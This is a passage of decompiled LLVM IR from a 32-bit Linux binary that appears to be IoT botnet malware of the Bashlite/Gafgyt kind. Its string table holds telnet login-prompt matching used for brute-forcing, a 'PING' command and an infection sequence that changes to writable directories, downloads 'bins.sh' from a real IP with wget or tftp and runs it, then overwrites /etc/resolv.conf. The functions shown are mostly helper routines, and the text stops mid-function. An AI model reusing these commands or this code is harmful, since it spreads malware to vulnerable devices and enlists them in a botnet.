source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }

@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805510c.2 = global i32 0
@global_var_8055124.3 = local_unnamed_addr global i32* @global_var_805510c.2
@global_var_80524fd.5 = constant [7 x i8] c"x86_32\00"
@global_var_805253a.10 = constant [8 x i8] c"UNKNOWN\00"
@global_var_8055440.11 = global i32 0
@global_var_8055444.12 = local_unnamed_addr global i32 0
@global_var_8055448.13 = local_unnamed_addr global i32 0
@global_var_805519c.14 = local_unnamed_addr global i32 4095
@global_var_8055198.15 = local_unnamed_addr global i32 362436
@global_var_8052542.16 = constant [7 x i8] c"(null)\00"
@global_var_8052549.18 = constant [3 x i8] c"-c\00"
@global_var_805254c.19 = constant [3 x i8] c"sh\00"
@global_var_805254f.20 = constant [8 x i8] c"/bin/sh\00"
@global_var_8052560.21 = constant i32 -1
@global_var_8052960.22 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805296e.23 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_8055420.24 = local_unnamed_addr global i32 0
@global_var_8052977.25 = constant [5 x i8] c"PING\00"
@global_var_8055428.26 = local_unnamed_addr global i32 0
@global_var_805542c.27 = local_unnamed_addr global i32 0
@global_var_805b4a8.28 = local_unnamed_addr global i32 0
@global_var_805297c.29 = constant [6 x i8] c":>%$#\00"
@global_var_8052983.30 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_805b4a0.31 = local_unnamed_addr global i32 0
@global_var_805298f.32 = constant [6 x i8] c"ogin:\00"
@global_var_8052995.33 = constant [3 x i8] c"\0D\0A\00"
@global_var_8052998.34 = constant [9 x i8] c"assword:\00"
@global_var_80529a1.35 = constant [9 x i8] c"ncorrect\00"
@global_var_80523e0.36 = constant [14 x i8] c"sh || shell\0D\0A\00"
@global_var_80523f0.37 = constant [79 x i8] c"cd /var/ || cd /tmp/ || cd /var/run( || cd /var/tmp/ || cd /dev/ || cd /mnt/\0D\0A\00"
@global_var_8052440.38 = constant [125 x i8] c"busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\0D\0A\00"
@global_var_80524c0.39 = constant [61 x i8] c"busybox echo || echo nameserver 8.8.8.8 > /etc/resolv.conf\0D\0A\00"
@global_var_8055188.40 = local_unnamed_addr global [4 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80523e0.36, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80523f0.37, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052440.38, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_80524c0.39, i32 0, i32 0)]
@global_var_8055194.41 = local_unnamed_addr global [61 x i8]* @global_var_80524c0.39
@global_var_805518c.42 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80523f0.37, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052440.38, i32 0, i32 0)]
@global_var_8055190.43 = local_unnamed_addr global [125 x i8]* @global_var_8052440.38
@global_var_80551a4 = external local_unnamed_addr global i32
@global_var_8055200.46 = global i32 288
@global_var_8055250.47 = local_unnamed_addr global i32 272
@global_var_805b494.49 = global i32 0
@global_var_8053160.50 = constant i32 0
@global_var_80551c8.51 = global i32 0
@global_var_80551e0.52 = global i32 0
@global_var_80551c4.53 = local_unnamed_addr global i32* @global_var_8055200.46
@global_var_80552f0.54 = global i32 0
@global_var_805b56c.56 = global i32 0
@global_var_805b570.57 = local_unnamed_addr global i32 0
@global_var_805b574.58 = global i32 0
@global_var_805b580.59 = local_unnamed_addr global i32 0
@global_var_805b874.60 = global i32 0
@global_var_805b89c.61 = local_unnamed_addr global i32 0
@global_var_805b88c.62 = local_unnamed_addr global i32 0
@global_var_805b890.63 = local_unnamed_addr global i32 0
@global_var_805b894.64 = local_unnamed_addr global i32 0
@global_var_805b898.65 = local_unnamed_addr global i32 0
@global_var_805b8a4.66 = local_unnamed_addr global i32 0
@global_var_805b8b0.67 = local_unnamed_addr global i32 0
@global_var_805b8a8.68 = local_unnamed_addr global i32 0
@global_var_805b8b4.69 = local_unnamed_addr global i32 0
@global_var_805b888.70 = local_unnamed_addr global i32 0
@global_var_805b884.72 = local_unnamed_addr global i32 0
@global_var_805b8ac.73 = local_unnamed_addr global i32 0
@global_var_805b57c.74 = local_unnamed_addr global i32 0
@global_var_8055308.75 = global i32 0
@global_var_8055320.77 = global i32 0
@global_var_8055338 = external global i32
@global_var_8055364.79 = global i32 -1726662223
@global_var_8055340.80 = local_unnamed_addr global i32* @global_var_8055364.79
@global_var_805533c.81 = global i32* @global_var_8055364.79
@global_var_8053db4.82 = constant i32 0
@global_var_8053da0.83 = constant i32 0
@global_var_80553e0.84 = global i32 0
@global_var_805b478.85 = local_unnamed_addr global i32 0
@global_var_805b480.86 = local_unnamed_addr global i32 0
@global_var_8055100.88 = global i32 -1
@global_var_8050dbb.89 = constant i32 -294069
@global_var_805b488.90 = local_unnamed_addr global i32 0
@global_var_805b48c.91 = local_unnamed_addr global i32 0
@global_var_8054020.92 = constant [10 x i8] c"/dev/null\00"
@global_var_805b484.94 = local_unnamed_addr global i32 0
@global_var_805b47c.95 = local_unnamed_addr global i32 0
@global_var_805317d.96 = constant i32 1970153472
@global_var_80553f8.97 = local_unnamed_addr global i32* @global_var_805317d.96
@global_var_8050fa1.98 = constant i32 1928542531
@global_var_8050fc5.99 = constant i32 1928542531
@global_var_805b49c.100 = local_unnamed_addr global i32 0
@global_var_805b8b8.101 = local_unnamed_addr global i32 0
@global_var_805b8bc.102 = local_unnamed_addr global i32 0
@global_var_8055400.1 = local_unnamed_addr global i8 0
@global_var_8059440.17 = external local_unnamed_addr global i8*
@global_var_805b540.55 = global i8 0
@global_var_805b8a0.71 = local_unnamed_addr global i8 0
@global_var_805b474.76 = local_unnamed_addr global i8 0
@global_var_805b490.93 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 53367
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052330()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8055400.1, align 1024
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055124.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055124.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055124.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8055400.1, align 1024
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055124.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8055400.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134562044)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v4_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @function_8050e57(i32 134533841, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134554456, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_804818d() local_unnamed_addr {
dec_label_pc_804818d:
  ret i32 ptrtoint ([7 x i8]* @global_var_80524fd.5 to i32)
}

define i32 @function_8048197() local_unnamed_addr {
dec_label_pc_8048197:
  %v1_80481a2 = call i32 @function_8050c58(i32 84)
  ret i32 %v1_80481a2
}

define i32 @function_80481ac() local_unnamed_addr {
dec_label_pc_80481ac:
  ret i32 ptrtoint ([8 x i8]* @global_var_805253a.10 to i32)
}

define i32 @function_8048229(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048229:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8055440.11, align 64
  %v1_804823a = add i32 %arg1, -1640531527
  store i32 %v1_804823a, i32* @global_var_8055444.12, align 4
  %v1_8048247 = add i32 %arg1, 1013904242
  store i32 %v1_8048247, i32* %eax.global-to-local, align 4
  store i32 %v1_8048247, i32* @global_var_8055448.13, align 8
  br label %dec_label_pc_804825a

dec_label_pc_804825a:                             ; preds = %dec_label_pc_8048229, %dec_label_pc_804825a
  %storemerge1 = phi i32 [ 3, %dec_label_pc_8048229 ], [ %v4_804828a, %dec_label_pc_804825a ]
  %v1_8048260 = add nsw i32 %storemerge1, -3
  store i32 %v1_8048260, i32* %eax.global-to-local, align 4
  %v1_8048263 = mul nuw nsw i32 %v1_8048260, 4
  %v2_8048263 = add i32 %v1_8048263, ptrtoint (i32* @global_var_8055440.11 to i32)
  %v3_8048263 = inttoptr i32 %v2_8048263 to i32*
  %v4_8048263 = load i32, i32* %v3_8048263, align 4
  %v1_804826d = add nsw i32 %storemerge1, -2
  store i32 %v1_804826d, i32* %eax.global-to-local, align 4
  %v1_8048270 = mul nuw nsw i32 %v1_804826d, 4
  %v2_8048270 = add i32 %v1_8048270, ptrtoint (i32* @global_var_8055440.11 to i32)
  %v3_8048270 = inttoptr i32 %v2_8048270 to i32*
  %v4_8048270 = load i32, i32* %v3_8048270, align 4
  %v2_8048277 = xor i32 %v4_8048270, %v4_8048263
  %v2_804827c = xor i32 %storemerge1, -1640531527
  %v1_804827e = xor i32 %v2_804827c, %v2_8048277
  store i32 %v1_804827e, i32* %eax.global-to-local, align 4
  %v2_8048283 = mul nuw nsw i32 %storemerge1, 4
  %v3_8048283 = add i32 %v2_8048283, ptrtoint (i32* @global_var_8055440.11 to i32)
  %v4_8048283 = inttoptr i32 %v3_8048283 to i32*
  store i32 %v1_804827e, i32* %v4_8048283, align 4
  %v4_804828a = add nuw nsw i32 %storemerge1, 1
  %exitcond = icmp eq i32 %v4_804828a, 4096
  br i1 %exitcond, label %dec_label_pc_8048296, label %dec_label_pc_804825a

dec_label_pc_8048296:                             ; preds = %dec_label_pc_804825a
  %v0_8048297 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8048297

; uselistorder directives
  uselistorder i32 %storemerge1, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804825a, { 1, 0 }
}

define i32 @function_8048298(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048298:
  %v0_80482b4 = load i32, i32* @global_var_805519c.14, align 4
  %v1_80482b9 = add i32 %v0_80482b4, 1
  %v1_80482ba = urem i32 %v1_80482b9, 4096
  store i32 %v1_80482ba, i32* @global_var_805519c.14, align 4
  %v1_80482c9 = mul nuw nsw i32 %v1_80482ba, 4
  %v2_80482c9 = add i32 %v1_80482c9, ptrtoint (i32* @global_var_8055440.11 to i32)
  %v3_80482c9 = inttoptr i32 %v2_80482c9 to i32*
  %v4_80482c9 = load i32, i32* %v3_80482c9, align 4
  %v7_80482e6 = udiv i32 %v4_80482c9, 228675
  store i32 %v7_80482e6, i32* @global_var_8055198.15, align 8
  br i1 true, label %dec_label_pc_8048336, label %dec_label_pc_8048328

dec_label_pc_8048328:                             ; preds = %dec_label_pc_8048298
  br label %dec_label_pc_8048336

dec_label_pc_8048336:                             ; preds = %dec_label_pc_8048298, %dec_label_pc_8048328
  %v1_804834b = mul nuw nsw i32 %v1_80482ba, 4
  %v2_804834b = add i32 %v1_804834b, ptrtoint (i32* @global_var_8055440.11 to i32)
  %v3_804834b = inttoptr i32 %v2_804834b to i32*
  %v4_804834b = load i32, i32* %v3_804834b, align 4
  ret i32 %v4_804834b

; uselistorder directives
  uselistorder i32 %v1_80482ba, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048336, { 1, 0 }
}

define i32 @function_8048358(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048358:
  %v4_8048366 = ptrtoint i8* %arg1 to i32
  %v3_8048377 = call i32 @_strlen(i8* %arg1)
  %v1_804837e = add i32 %v3_8048377, -1
  br label %dec_label_pc_8048387

dec_label_pc_8048387:                             ; preds = %dec_label_pc_8048387, %dec_label_pc_8048358
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_8048358 ], [ %v4_8048384, %dec_label_pc_8048387 ]
  %v6_804838a = add i32 %stack_var_-16.0, %v4_8048366
  %v1_804838d = inttoptr i32 %v6_804838a to i8*
  %v2_804838d = load i8, i8* %v1_804838d, align 1
  %v2_804838f = sext i8 %v2_804838d to i32
  %v1_8048396 = call i32 @function_804e1b8(i32 %v2_804838f)
  %v1_804839e = icmp eq i32 %v1_8048396, 0
  %v1_80483a0 = icmp eq i1 %v1_804839e, false
  %v4_8048384 = add i32 %stack_var_-16.0, 1
  br i1 %v1_80483a0, label %dec_label_pc_8048387, label %dec_label_pc_80483a7.preheader

dec_label_pc_80483a7.preheader:                   ; preds = %dec_label_pc_8048387
  %v5_80483ad11 = icmp slt i32 %v1_804837e, %stack_var_-16.0
  br i1 %v5_80483ad11, label %dec_label_pc_80483ca, label %dec_label_pc_80483af

dec_label_pc_80483a4:                             ; preds = %dec_label_pc_80483af
  %v4_80483a4 = add i32 %stack_var_-12.012, -1
  %v5_80483ad = icmp slt i32 %v4_80483a4, %stack_var_-16.0
  br i1 %v5_80483ad, label %dec_label_pc_80483ca, label %dec_label_pc_80483af

dec_label_pc_80483af:                             ; preds = %dec_label_pc_80483a7.preheader, %dec_label_pc_80483a4
  %stack_var_-12.012 = phi i32 [ %v4_80483a4, %dec_label_pc_80483a4 ], [ %v1_804837e, %dec_label_pc_80483a7.preheader ]
  %v6_80483b2 = add i32 %stack_var_-12.012, %v4_8048366
  %v1_80483b5 = inttoptr i32 %v6_80483b2 to i8*
  %v2_80483b5 = load i8, i8* %v1_80483b5, align 1
  %v2_80483b7 = sext i8 %v2_80483b5 to i32
  %v1_80483be = call i32 @function_804e1b8(i32 %v2_80483b7)
  %v1_80483c6 = icmp eq i32 %v1_80483be, 0
  %v1_80483c8 = icmp eq i1 %v1_80483c6, false
  br i1 %v1_80483c8, label %dec_label_pc_80483a4, label %dec_label_pc_80483ca

dec_label_pc_80483ca:                             ; preds = %dec_label_pc_80483a4, %dec_label_pc_80483af, %dec_label_pc_80483a7.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_804837e, %dec_label_pc_80483a7.preheader ], [ %v4_80483a4, %dec_label_pc_80483a4 ], [ %stack_var_-12.012, %dec_label_pc_80483af ]
  %v7_80483f225 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.lcssa
  br i1 %v7_80483f225, label %dec_label_pc_80483f4, label %dec_label_pc_80483d2

dec_label_pc_80483d2:                             ; preds = %dec_label_pc_80483ca, %dec_label_pc_80483d2
  %v6_80483fc27 = phi i32 [ %v6_80483fc, %dec_label_pc_80483d2 ], [ %v4_8048366, %dec_label_pc_80483ca ]
  %storemerge26 = phi i32 [ %v4_80483e9, %dec_label_pc_80483d2 ], [ %stack_var_-16.0, %dec_label_pc_80483ca ]
  %v6_80483e2 = add i32 %storemerge26, %v4_8048366
  %v1_80483e5 = inttoptr i32 %v6_80483e2 to i8*
  %v2_80483e5 = load i8, i8* %v1_80483e5, align 1
  %v3_80483e7 = inttoptr i32 %v6_80483fc27 to i8*
  store i8 %v2_80483e5, i8* %v3_80483e7, align 1
  %v4_80483e9 = add i32 %storemerge26, 1
  %v7_80483f2 = icmp sgt i32 %v4_80483e9, %stack_var_-12.0.lcssa
  %v2_80483fa = sub i32 %v4_80483e9, %stack_var_-16.0
  %v6_80483fc = add i32 %v2_80483fa, %v4_8048366
  br i1 %v7_80483f2, label %dec_label_pc_80483f4, label %dec_label_pc_80483d2

dec_label_pc_80483f4:                             ; preds = %dec_label_pc_80483d2, %dec_label_pc_80483ca
  %v6_80483fc.lcssa = phi i32 [ %v4_8048366, %dec_label_pc_80483ca ], [ %v6_80483fc, %dec_label_pc_80483d2 ]
  %v22_80483fc = inttoptr i32 %v6_80483fc.lcssa to i8*
  store i8 0, i8* %v22_80483fc, align 1
  ret i32 %v6_80483fc.lcssa

; uselistorder directives
  uselistorder i32 %v6_80483fc.lcssa, { 1, 0 }
  uselistorder i32 %v4_80483e9, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 4, 2, 3, 6, 5 }
  uselistorder i32 %v1_804837e, { 1, 2, 0 }
  uselistorder i32 %v4_8048366, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 (i32)* @function_804e1b8, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80483d2, { 1, 0 }
  uselistorder label %dec_label_pc_80483ca, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80483af, { 1, 0 }
}

define i32 @function_8048407(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048407:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804840d = icmp eq i32* %arg1, null
  br i1 %v4_804840d, label %dec_label_pc_804842c, label %dec_label_pc_8048413

dec_label_pc_8048413:                             ; preds = %dec_label_pc_8048407
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048416 = load i32, i32* %arg1, align 4
  %v3_804841b = inttoptr i32 %v2_8048416 to i8*
  store i8 %tmp8, i8* %v3_804841b, align 1
  %v2_8048420 = load i32, i32* %arg1, align 4
  %v1_8048422 = add i32 %v2_8048420, 1
  store i32 %v1_8048422, i32* @edx, align 4
  store i32 %v1_8048422, i32* %arg1, align 4
  br label %dec_label_pc_804843f

dec_label_pc_804842c:                             ; preds = %dec_label_pc_8048407
  %v3_8048437 = bitcast i8* %stack_var_8 to i32*
  %v4_8048437 = call i32 @function_804e180(i32 1, i32* %v3_8048437, i32 1)
  br label %dec_label_pc_804843f

dec_label_pc_804843f:                             ; preds = %dec_label_pc_8048413, %dec_label_pc_804842c
  %v0_8048440 = phi i32 [ %tmp3, %dec_label_pc_8048413 ], [ %v4_8048437, %dec_label_pc_804842c ]
  ret i32 %v0_8048440

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804843f, { 1, 0 }
}

define i32 @function_8048441(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048441:
  %tmp57 = icmp slt i32 %arg3, 1
  br i1 %tmp57, label %dec_label_pc_80484a1.thread, label %dec_label_pc_804845b

dec_label_pc_80484a1.thread:                      ; preds = %dec_label_pc_8048441
  %.pre = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_80484eb.preheader

dec_label_pc_804845b:                             ; preds = %dec_label_pc_8048441
  %v4_8048462 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8048462, i32* @edx, align 4
  %v2_804847327 = load i8, i8* %arg2, align 1
  %v3_804847328 = zext i8 %v2_804847327 to i32
  %v5_804847330 = and i32 %v4_8048462, -256
  %v6_804847331 = or i32 %v3_804847328, %v5_804847330
  %v4_804847532 = icmp eq i8 %v2_804847327, 0
  %v1_804847734 = icmp eq i1 %v4_804847532, false
  br i1 %v1_804847734, label %dec_label_pc_804846a, label %dec_label_pc_8048479

dec_label_pc_804846a:                             ; preds = %dec_label_pc_804845b, %dec_label_pc_804846a
  %v4_8048473 = phi i32 [ %v6_8048473, %dec_label_pc_804846a ], [ %v6_804847331, %dec_label_pc_804845b ]
  %v4_804847036 = phi i32 [ %v5_804846d, %dec_label_pc_804846a ], [ %v4_8048462, %dec_label_pc_804845b ]
  %stack_var_-12.035 = phi i32 [ %v4_804846a, %dec_label_pc_804846a ], [ 0, %dec_label_pc_804845b ]
  %v4_804846a = add i32 %stack_var_-12.035, 1
  %v5_804846d = add i32 %v4_804847036, 1
  %v22_804846d = inttoptr i32 %v5_804846d to i8*
  store i32 %v5_804846d, i32* @edx, align 4
  %v2_8048473 = load i8, i8* %v22_804846d, align 1
  %v3_8048473 = zext i8 %v2_8048473 to i32
  %v5_8048473 = and i32 %v4_8048473, -256
  %v6_8048473 = or i32 %v3_8048473, %v5_8048473
  %v4_8048475 = icmp eq i8 %v2_8048473, 0
  %v1_8048477 = icmp eq i1 %v4_8048475, false
  br i1 %v1_8048477, label %dec_label_pc_804846a, label %dec_label_pc_8048479

dec_label_pc_8048479:                             ; preds = %dec_label_pc_804846a, %dec_label_pc_804845b
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804845b ], [ %v4_804846a, %dec_label_pc_804846a ]
  %v5_804847f = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_804847f, label %dec_label_pc_804848a, label %dec_label_pc_80484a1

dec_label_pc_804848a:                             ; preds = %dec_label_pc_8048479
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_804848d = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80484a1

dec_label_pc_80484a1:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_8048479
  %storemerge = phi i32 [ %v5_804848d, %dec_label_pc_804848a ], [ 0, %dec_label_pc_8048479 ]
  %v1_8048493 = mul i32 %arg4, 8
  %tmp58 = and i32 %v1_8048493, 16
  %tmp59 = or i32 %tmp58, 32
  %v1_80484a4 = urem i32 %arg4, 2
  %v2_80484a4 = icmp eq i32 %v1_80484a4, 0
  %tmp60 = icmp slt i32 %storemerge, 1
  %tmp61 = icmp eq i1 %tmp60, false
  %or.cond = and i1 %v2_80484a4, %tmp61
  br i1 %or.cond, label %dec_label_pc_80484ad.lr.ph, label %dec_label_pc_80484eb.preheader

dec_label_pc_80484ad.lr.ph:                       ; preds = %dec_label_pc_80484a1
  %v2_80484b6 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_80484ad

dec_label_pc_80484ad:                             ; preds = %dec_label_pc_80484ad.lr.ph, %dec_label_pc_80484ad
  %stack_var_-20.023 = phi i32 [ 0, %dec_label_pc_80484ad.lr.ph ], [ %v4_80484be, %dec_label_pc_80484ad ]
  %stack_var_12.122 = phi i32 [ %storemerge, %dec_label_pc_80484ad.lr.ph ], [ %v4_80484c1, %dec_label_pc_80484ad ]
  %v3_80484b6 = call i32 @function_8048407(i32* %v2_80484b6, i32 %tmp59)
  %v4_80484be = add i32 %stack_var_-20.023, 1
  %v4_80484c1 = add i32 %stack_var_12.122, -1
  %tmp62 = icmp slt i32 %v4_80484c1, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_80484ad, label %dec_label_pc_80484eb.preheader

dec_label_pc_80484eb.preheader:                   ; preds = %dec_label_pc_80484ad, %dec_label_pc_80484a1.thread, %dec_label_pc_80484a1
  %v4_80484eb7.pre-phi = phi i32 [ %.pre, %dec_label_pc_80484a1.thread ], [ %v4_8048462, %dec_label_pc_80484a1 ], [ %v4_8048462, %dec_label_pc_80484ad ]
  %stack_var_-16.073 = phi i32 [ 32, %dec_label_pc_80484a1.thread ], [ %tmp59, %dec_label_pc_80484a1 ], [ %tmp59, %dec_label_pc_80484ad ]
  %stack_var_12.2.ph = phi i32 [ %arg3, %dec_label_pc_80484a1.thread ], [ %storemerge, %dec_label_pc_80484a1 ], [ %v4_80484c1, %dec_label_pc_80484ad ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_80484a1.thread ], [ 0, %dec_label_pc_80484a1 ], [ %v4_80484be, %dec_label_pc_80484ad ]
  %v2_80484ee8 = load i8, i8* %arg2, align 1
  %v4_80484f012 = icmp eq i8 %v2_80484ee8, 0
  %v1_80484f214 = icmp eq i1 %v4_80484f012, false
  br i1 %v1_80484f214, label %dec_label_pc_80484cc.lr.ph, label %dec_label_pc_804850d.preheader

dec_label_pc_80484cc.lr.ph:                       ; preds = %dec_label_pc_80484eb.preheader
  %v2_80484dd = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_80484cc

dec_label_pc_80484cc:                             ; preds = %dec_label_pc_80484cc.lr.ph, %dec_label_pc_80484cc
  %v4_80484eb17 = phi i32 [ %v4_80484eb7.pre-phi, %dec_label_pc_80484cc.lr.ph ], [ %v5_80484e8, %dec_label_pc_80484cc ]
  %stack_var_-20.116 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484cc.lr.ph ], [ %v4_80484e5, %dec_label_pc_80484cc ]
  %stack_var_8.015 = phi i8* [ %arg2, %dec_label_pc_80484cc.lr.ph ], [ %v22_80484e8, %dec_label_pc_80484cc ]
  %v2_80484cf = load i8, i8* %stack_var_8.015, align 1
  %v3_80484cf = zext i8 %v2_80484cf to i32
  %v3_80484dd = call i32 @function_8048407(i32* %v2_80484dd, i32 %v3_80484cf)
  %v4_80484e5 = add i32 %stack_var_-20.116, 1
  %v5_80484e8 = add i32 %v4_80484eb17, 1
  %v22_80484e8 = inttoptr i32 %v5_80484e8 to i8*
  %v2_80484ee = load i8, i8* %v22_80484e8, align 1
  %v4_80484f0 = icmp eq i8 %v2_80484ee, 0
  %v1_80484f2 = icmp eq i1 %v4_80484f0, false
